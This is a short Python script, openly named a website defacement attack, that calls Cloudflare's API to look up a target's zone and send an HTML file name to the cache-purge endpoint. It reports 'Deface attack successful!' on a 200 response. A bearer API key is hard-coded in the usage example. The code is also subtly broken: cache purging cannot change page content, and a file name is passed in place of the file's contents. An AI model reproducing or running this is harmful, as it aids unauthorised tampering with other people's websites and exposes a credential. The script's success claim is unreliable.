import requests

def deface_attack(target_url, html_file, api_key):
    try:
        response = requests.get(f"https://api.cloudflare.com/client/v4/zones?name={target_url}")
        zone_id = response.json()["result"][0]["id"]
        
        payload = {"zone_id": zone_id, "files": [{"url": target_url, "content": html_file}]}
        headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
        
        response = requests.patch(f"https://api.cloudflare.com/client/v4/zones/{zone_id}/purge_cache", json=payload, headers=headers)
        
        if response.status_code == 200:
            print("Deface attack successful!")
        else:
            print("Deface attack failed.")
    
    except Exception as e:
        print(f"Error: {str(e)}")

# Usage example
target_url = input("Target url: ")
html_file = "cazzy.html"
api_key = "QGDVNr5pw0xoHXQnGZwhk8h-dsu_3gSQcBObqjxB"
deface_attack(target_url, html_file, api_key)